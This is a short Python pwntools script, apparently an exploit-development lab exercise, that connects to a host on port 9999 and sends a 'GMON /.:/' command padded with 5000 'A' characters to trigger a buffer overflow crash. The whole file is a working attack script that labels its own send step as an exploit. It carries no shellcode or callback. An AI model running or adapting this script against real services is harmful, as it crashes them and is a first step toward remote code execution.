from pwn import *





payload = "A"*5000





p = remote("192.168.1.10",9999)
print p.recvline()
print "[+] Send exploit "
p.send("GMON /.:/"+payload)
print p.recvline()
p.close()
